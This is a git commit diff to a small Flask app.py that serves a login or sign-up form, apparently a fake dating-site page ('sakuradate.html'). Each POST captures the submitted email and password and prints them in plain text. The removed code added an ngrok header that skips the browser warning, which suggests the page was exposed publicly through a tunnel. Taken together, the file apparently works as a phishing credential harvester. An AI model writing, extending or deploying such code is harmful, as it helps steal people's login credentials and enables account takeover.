5382eb0306cd4c2f6e6a4229c93cc85c92599a88
Daniil22855 <daniilgay2286@gmail.com>
2025-04-01 21:56:48 +0200

    Update app.py

--- app.py
+++ app.py
@@ -1,32 +1,18 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, redirect, url_for
 
 app = Flask(__name__)
-
-@app.after_request
-def add_ngrok_headers(response):
-    response.headers['ngrok-skip-browser-warning'] = 'anyvalue'
-    return response
-
-@app.route('/')
-def home():
-    return render_template('login.html')
-
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         email = request.form.get('email')
         password = request.form.get('password')
-        print(f"\n=== Получены данные ===")
+        print(f"\n=== Данные регистрации ===")
         print(f"Email: {email}")
         print(f"Password: {password}")
-        print("=====================\n")
-
-        # Не делаем редирект, а просто снова показываем форму
-        return render_template('login.html')
-
-    return render_template('login.html')
-
+        print("=========================")
+        return redirect(url_for('login'))
+    return render_template('sakuradate.html')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
